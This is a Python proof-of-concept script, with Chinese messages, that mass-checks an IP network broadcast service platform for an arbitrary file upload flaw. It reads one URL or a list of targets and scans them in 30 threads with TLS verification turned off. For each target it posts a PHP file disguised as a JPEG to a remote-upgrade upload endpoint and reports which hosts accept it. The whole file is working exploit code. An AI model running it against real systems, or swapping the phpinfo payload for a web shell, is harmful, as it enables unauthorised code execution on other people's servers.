import requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    targets = []
    parse = argparse.ArgumentParser(description="IP网络广播服务平台存在任意文件上传漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='input file')

    args = parse.parse_args()
    pool = Pool(30)

    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            target = f"http://{args.url}"
            check(target)
    elif args.file:
        f = open(args.file, 'r+')
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
    pool.map(check, targets)
    pool.close()

def check(target):
    target = f"{target}/api/v2/remote-upgrade/upload"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Connection': 'close',
    }
    data = '''------WebKitFormBoundarytiZYyyKkbwCxtHC1
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarytiZYyyKkbwCxtHC1--'''
    try:
        response = requests.post(target, headers=headers, verify=False, data=data,timeout=5)
        if response.status_code == 200 and '1.php' in response.text:
            print(f"[+] {target} 存在漏洞！")
        else:
            print(f"[-] {target} 不存在漏洞！")
    except Exception as e:
        print(f"[TimeOut] {target} 超时")

if __name__ == '__main__':
    main()